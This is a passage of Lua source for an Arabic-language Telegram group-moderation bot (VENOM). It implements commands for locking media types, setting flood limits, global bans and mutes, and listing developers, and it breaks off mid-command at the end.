send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الملفات بالكتم ')  
end,nil)   
elseif text == 'قفل الملفات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الملفات بالطرد ')  
end,nil)   
elseif text == 'فتح الملفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Document"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فتح الملفات ')  
end,nil)   
end
if text == 'قفل السيلفي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل السيلفي ')  
end,nil)   
elseif text == 'قفل السيلفي بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل السيلفي بالتقييد ')  
end,nil)
elseif text == 'قفل السيلفي بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل السيلفي بالكتم ')  
end,nil)   
elseif text == 'قفل السيلفي بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل السيلفي بالطرد ')  
end,nil)   
elseif text == 'فتح السيلفي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Unsupported"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فتح السيلفي ')  
end,nil)   
end
if text == 'قفل الماركداون' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n ?? تـم قفـل الماركداون ')  
end,nil)   
elseif text == 'قفل الماركداون بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الماركداون بالتقييد ')  
end,nil)
elseif text == 'قفل الماركداون بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الماركداون بالكتم ')  
end,nil)   
elseif text == 'قفل الماركداون بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الماركداون بالطرد ')  
end,nil)   
elseif text == 'فتح الماركداون' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Markdaun"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فتح الماركداون ')  
end,nil)   
end
if text == 'قفل الجهات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الجهات ')  
end,nil)   
elseif text == 'قفل الجهات بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الجهات بالتقييد ')  
end,nil)
elseif text == 'قفل الجهات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الجهات بالكتم ')  
end,nil)   
elseif text == 'قفل الجهات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الجهات بالطرد ')  
end,nil)   
elseif text == 'فتح الجهات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Contact"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فتح الجهات ')  
end,nil)   
end
if text == 'قفل الكلايش' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الكلايش ')  
end,nil)   
elseif text == 'قفل الكلايش بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الكلايش بالتقييد ')  
end,nil)
elseif text == 'قفل الكلايش بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الكلايش بالكتم ')  
end,nil)   
elseif text == 'قفل الكلايش بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم قفـل الكلايش بالطرد ')  
end,nil)   
elseif text == 'فتح الكلايش' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Spam"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖥔  مـن قبـل  ↚ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n 𖥔 تـم فتح الكلايش ')  
end,nil)   
end
if text == 'قفل التكرار بالطرد' and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'kick')  
send(msg.chat_id_, msg.id_,' 𖥔 تم قفل التكرار بالطرد')
elseif text == 'قفل التكرار' and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'del')  
send(msg.chat_id_, msg.id_,' 𖥔 تم قفل التكرار')
elseif text == 'قفل التكرار بالتقييد' and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'keed')  
send(msg.chat_id_, msg.id_,' 𖥔 تم قفل التكرار بالتقييد')
elseif text == 'قفل التكرار بالكتم' and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'mute')  
send(msg.chat_id_, msg.id_,' 𖥔 تم قفل التكرار بالكتم')
elseif text == 'فتح التكرار' and Mod(msg) then 
database:hdel(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood")  
send(msg.chat_id_, msg.id_,' 𖥔 تم فتح التكرار')
end
--------------------------------------------------------------------------------------------------------------
if text == 'تحديث' and Devban(msg) then    
dofile('VENOM.lua')  
send(msg.chat_id_, msg.id_, ' 𖥔 تم تحديث جميع الملفات') 
end 
if text == ("مسح قائمه العام") and Devban(msg) then
database:del(bot_id..'GVNO:User')
send(msg.chat_id_, msg.id_, '\n 𖥔 تم مسح قائمه العام')
return false
end
if text == ("مسح الحظر العام") and Devban(msg) then
database:del(bot_id..'GVNO:User')
send(msg.chat_id_, msg.id_, '\n 𖥔 تم مسح الحظر العام')
return false
end
if text == ("مسح الكتم العام") and Devban(msg) then
database:del(bot_id..'GVNO:User')
send(msg.chat_id_, msg.id_, '\n 𖥔 تم مسح الكتم العام')
return false
end
if text == ("قائمه العام") and Devban(msg) then
local list = database:smembers(bot_id..'GVNO:User')
t = "\n 𖥔 قائمة المحظورين عام \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد محظورين عام"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("حظر عام") and msg.reply_to_message_id_ and SudoBot(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.sender_user_id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " 𖥔 لا يمكنك حظر المطور الاساسي \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع حظر البوت عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1804133252) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1896382059) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(944353237) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1360140225) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع حظر مبرمج السورس عام")
return false 
end
database:sadd(bot_id..'GVNO:User', result.sender_user_id_)
chat_kick(result.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},
function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCEVENOM')..')'
status  = '\n 𖥔 تم حظرو عام من الجروبات '
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^حظر عام @(.*)$")  and SudoBot(msg) then
local username = text:match("^حظر عام @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local Groups = database:scard(bot_id..'Chek:Groups')  
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," 𖥔 عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع حظر البوت عام")
return false 
end
if result.id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " 𖥔 لا يمكنك حظر المطور الاساسي \n")
return false 
end
if result.id_ == tonumber(1804133252) then
send(msg.chat_id_, msg.id_, " 𖥔 لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1896382059) then
send(msg.chat_id_, msg.id_, " 𖥔 لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(944353237) then
send(msg.chat_id_, msg.id_, "  لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1360140225) then
send(msg.chat_id_, msg.id_, " ?? لا يمكنك حظر مبرمج السورس \n")
return false 
end
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'SOURCEVENOM')..')'
status  = '\n 𖥔 تم حظرو عام من الجروبات '
texts = usertext..status
database:sadd(bot_id..'GVNO:User', result.id_)
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^حظر عام (%d+)$") and SudoBot(msg) then
local userid = text:match("^حظر عام (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local Groups = database:scard(bot_id..'Chek:Groups')  
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if userid == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " 𖥔 لا يمكنك حظر المطور الاساسي \n")
return false 
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع حظر البوت عام")
return false 
end
if tonumber(userid) == tonumber(1804133252) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(944353237) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(1896382059) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(1360140225) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع حظر مبرمج السورس عام")
return false 
end
database:sadd(bot_id..'GVNO:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCEVENOM')..')'
status  = '\n 𖥔 تم حظرو عام من الجروبات '
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم حظرو عام من الجروبات '
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("كتم عام") and msg.reply_to_message_id_ and SudoBot(msg) then
if AddChannel(msg.sender_user_id_) == false then
local Groups = database:scard(bot_id..'Chek:Groups')  
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.sender_user_id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " 𖥔 لا يمكنك كتم المطور الاساسي \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع كتم البوت عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1804133252) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع كتم مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(944353237) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع كتم مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1896382059) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع كتم مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1360140225) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع كتم مبرمج السورس عام")
return false 
end
database:sadd(bot_id..'Gmute:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},
function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCEVENOM')..')'
status  = '\n 𖥔 تم كتمه عام من الجروبات'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^كتم عام @(.*)$")  and SudoBot(msg) then
local username = text:match("^كتم عام @(.*)$") 
local Groups = database:scard(bot_id..'Chek:Groups')  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," 𖥔 عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع كتم البوت عام")
return false 
end
if result.id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " 𖥔 لا يمكنك كتم المطور الاساسي \n")
return false 
end
if result.id_ == tonumber(1804133252) then
send(msg.chat_id_, msg.id_, " 𖥔 لا يمكنك كتم مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1896382059) then
send(msg.chat_id_, msg.id_, " 𖥔 لا يمكنك كتم مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(944353237) then
send(msg.chat_id_, msg.id_, " 𖥔 لا يمكنك كتم مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1360140225) then
send(msg.chat_id_, msg.id_, " 𖥔 لا يمكنك كتم مبرمج السورس \n")
return false 
end
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'SOURCEVENOM')..')'
status  = '\n 𖥔 تم كتمه عام من الجروبات'
texts = usertext..status
database:sadd(bot_id..'Gmute:User', result.id_)
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^كتم عام (%d+)$") and SudoBot(msg) then
local userid = text:match("^كتم عام (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local Groups = database:scard(bot_id..'Chek:Groups')  
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if userid == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " 𖥔 لا يمكنك كتم المطور الاساسي \n")
return false 
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع كتم البوت عام")
return false 
end
if tonumber(userid) == tonumber(1804133252) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع كتم مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(1896382059) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع كتم مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(944353237) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع كتم مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(1360140225) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع كتم مبرمج السورس عام")
return false 
end
database:sadd(bot_id..'Gmute:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCEVENOM')..')'
status  = '\n 𖥔 تم كتمه عام من الجروبات'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم كتمه عام من الجروبات'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("الغاء العام") and msg.reply_to_message_id_ and SudoBot(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCEVENOM')..')'
status  = '\n 𖥔 تم الغاء (الحظر-الكتم) عام من الجروبات'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
database:srem(bot_id..'GVNO:User', result.sender_user_id_)
database:srem(bot_id..'Gmute:User', result.sender_user_id_)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^الغاء العام @(.*)$") and SudoBot(msg) then
local username = text:match("^الغاء العام @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'SOURCEVENOM')..')'
status  = '\n 𖥔 تم الغاء (الحظر-الكتم) عام من الجروبات'
texts = usertext..status
database:srem(bot_id..'GVNO:User', result.id_)
database:srem(bot_id..'Gmute:User', result.id_)
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^الغاء العام (%d+)$") and SudoBot(msg) then
local userid = text:match("^الغاء العام (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'GVNO:User', userid)
database:srem(bot_id..'Gmute:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCEVENOM')..')'
status  = '\n 𖥔 تم الغاء (الحظر-الكتم) عام من الجروبات'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم الغاء (الحظر-الكتم) عام من الجروبات '
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == ("مسح المطورين") and Devban(msg) then
database:del(bot_id..'Sudo:User')
send(msg.chat_id_, msg.id_, "\n 𖥔 تم مسح قائمة المطورين  ")
end
if text == ("المطورين") and Devban(msg) then
local list = database:smembers(bot_id..'Sudo:User')
t = "\n 𖥔  قائمة مطورين البوت \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " 𖥔  لا يوجد مطورين"
end
send(msg.chat_id_, msg.id_, t)
end


if text and text:match("^all (.*)$") or text:match("^@all (.*)$") and CoSu(msg) then 
local ttag = text:match("^all (.*)$") or text:match("^@all (.*)$") 
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then 
